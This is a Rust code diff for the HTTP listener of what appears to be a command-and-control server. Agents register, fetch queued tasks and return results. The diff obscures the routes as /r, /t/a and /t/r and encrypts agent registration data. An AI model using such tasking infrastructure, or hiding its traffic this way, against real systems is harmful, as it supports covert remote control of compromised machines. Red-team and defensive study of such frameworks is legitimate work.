@@ -17,9 +17,9 @@ use tower_http::timeout::TimeoutLayer;
 
 use crate::{
     server::{
-        agents::{Agent, AgentData, AgentTask},
+        agents::{Agent, AgentDataEnc, AgentTask, dec_agentdataenc},
         db,
-        jobs::JobMessage, crypto::aesgcm::{encrypt, encode},
+        jobs::JobMessage, crypto::aesgcm::encrypt_encode,
     },
     utils::fs::{empty_file, mkdir, mkfile, read_file, write_file},
 };
@@ -33,11 +33,11 @@ pub async fn start_http_listener(
 ) {
     let app = Router::new()
         .route("/", get(hello))
-        .route("/reg", post(register))
+        .route("/r", post(register))
         .with_state(db_path.to_string())
-        .route("/task/ask", post(task_ask))
+        .route("/t/a", post(task_ask))
         .with_state(db_path.to_string())
-        .route("/task/result", post(task_result))
+        .route("/t/r", post(task_result))
         .with_state(db_path.to_string())
         .layer((
             TraceLayer::new_for_http(),
@@ -122,20 +122,23 @@ async fn hello() -> &'static str {
 
 async fn register(
     State(db_path): State<String>,
-    Json(payload): Json<AgentData>,
+    Json(payload): Json<AgentDataEnc>,
 ) -> (StatusCode, String) {
 
-    info!("Agent requested `/reg`");
+    info!("Agent requested `/r`");
+
+    // Decode and decrypt AgentDataEnc
+    let ad = dec_agentdataenc(payload);
 
     let agent = Agent {
         id: 0, // Temporary ID
-        name: payload.name,
-        hostname: payload.hostname,
-        os: payload.os,
-        arch: payload.arch,
-        listener_url: payload.listener_url,
-        key: payload.key.to_string(),
-        nonce: payload.nonce.to_string(),
+        name: ad.name,
+        hostname: ad.hostname,
+        os: ad.os,
+        arch: ad.arch,
+        listener_url: ad.listener_url,
+        key: ad.key.to_string(),
+        nonce: ad.nonce.to_string(),
         task: AgentTask::Empty,
         task_result: None,
     };
@@ -160,21 +163,21 @@ async fn register(
                     }
                 }
 
-                let ciphertext = encrypt(
+                let ciphertext = encrypt_encode(
                     "Agent already exists.".as_bytes(),
-                    payload.key.as_bytes(),
-                    payload.nonce.as_bytes(),
-                ).unwrap();
-                return (StatusCode::OK, encode(&ciphertext));
+                    ad.key.as_bytes(),
+                    ad.nonce.as_bytes(),
+                );
+                return (StatusCode::OK, ciphertext);
             }
         }
         Err(e) => {
-            let ciphertext = encrypt(
+            let ciphertext = encrypt_encode(
                 format!("Error: {}", e.to_string()).as_bytes(),
-                payload.key.as_bytes(),
-                payload.nonce.as_bytes(),
-            ).unwrap();
-            return (StatusCode::OK, encode(&ciphertext));
+                ad.key.as_bytes(),
+                ad.nonce.as_bytes(),
+            );
+            return (StatusCode::OK, ciphertext);
         }
     }
 
@@ -186,82 +189,90 @@ async fn register(
             mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
             mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
 
-            let ciphertext = encrypt(
+            let ciphertext = encrypt_encode(
                 "Agent registered".as_bytes(),
-                payload.key.as_bytes(),
-                payload.nonce.as_bytes(),
-            ).unwrap();
-
-            (StatusCode::OK, encode(&ciphertext))
+                ad.key.as_bytes(),
+                ad.nonce.as_bytes(),
+            );
+            (StatusCode::OK, ciphertext)
         },
         Err(e) => {
             error!("{e}");
-            let ciphertext = encrypt(
+            let ciphertext = encrypt_encode(
                 "Agent already exists.".as_bytes(),
-                payload.key.as_bytes(),
-                payload.nonce.as_bytes(),
-            ).unwrap();
-            (StatusCode::OK, encode(&ciphertext))
+                ad.key.as_bytes(),
+                ad.nonce.as_bytes(),
+            );
+            (StatusCode::OK, ciphertext)
         }
     }
 }
 
 async fn task_ask(
     State(db_path): State<String>,
-    Json(payload): Json<AgentData>,
+    Json(payload): Json<AgentDataEnc>,
 ) -> (StatusCode, String) {
-    info!("Agent requested `/task/ask`");
+    info!("Agent requested `/t/a`");
 
-    let agent = db::get_agent(db_path, payload.name.to_string()).unwrap();
+    // Decode and decrypt AgentDataEnc
+    let ad = dec_agentdataenc(payload);
+
+    let agent = db::get_agent(db_path, ad.name.to_string()).unwrap();
     let key = agent.key;
     let nonce = agent.nonce;
 
-    if let Ok(task) = read_file(format!("agents/{}/task/name", payload.name)) {
-        let ciphertext = encrypt(
+    if let Ok(task) = read_file(format!("agents/{}/task/name", ad.name)) {
+        let ciphertext = encrypt_encode(
             &task,
             key.as_bytes(),
             nonce.as_bytes()
-        ).unwrap();
-        return (StatusCode::OK, encode(&ciphertext));
+        );
+        return (StatusCode::OK, ciphertext);
     } else {
-        let ciphertext = encrypt(
+        let ciphertext = encrypt_encode(
             "Task not found.".as_bytes(),
             key.as_bytes(),
             nonce.as_bytes()
-        ).unwrap();
-        return (StatusCode::NOT_FOUND, encode(&ciphertext));
+        );
+        return (StatusCode::NOT_FOUND, ciphertext);
     }
 }
 
 async fn task_result(
     State(db_path): State<String>,
-    Json(payload): Json<AgentData>,
+    Json(payload): Json<AgentDataEnc>,
 ) -> (StatusCode, String) {
-    info!("Agent requested `/task/result`");
+    info!("Agent requested `/t/r`");
 
-    let agent = db::get_agent(db_path, payload.name.to_string()).unwrap();
+    // Decode and decrypt AgentDataEnc
+    let ad = dec_agentdataenc(payload);
+
+    let agent = db::get_agent(db_path, ad.name.to_string()).unwrap();
     let key = agent.key;
     let nonce = agent.nonce;
 
-    if let Ok(_) = write_file(format!("agents/{}/task/result", payload.name), &payload.task_result.unwrap_or(Vec::new())) {
+    if let Ok(_) = write_file(
+        format!(
+            "agents/{}/task/result", ad.name),
+            &ad.task_result.unwrap_or(Vec::new()),
+    ) {
         // Initialize task
-        empty_file(format!("agents/{}/task/name", payload.name)).unwrap();
+        empty_file(format!("agents/{}/task/name", ad.name)).unwrap();
 
-        let ciphertext = encrypt(
+        let ciphertext = encrypt_encode(
             "The task result sent.".as_bytes(),
             key.as_bytes(),
             nonce.as_bytes(),
-        ).unwrap();
+        );
 
-        return (StatusCode::OK, encode(&ciphertext));
+        return (StatusCode::OK, ciphertext);
     } else {
-        let ciphertext = encrypt(
+        let ciphertext = encrypt_encode(
             "Error.".as_bytes(),
             key.as_bytes(),
             nonce.as_bytes(),
-        ).unwrap();
-
-        return (StatusCode::NOT_ACCEPTABLE, encode(&ciphertext));
+        );
+        return (StatusCode::NOT_ACCEPTABLE, ciphertext);
     }
 }
 
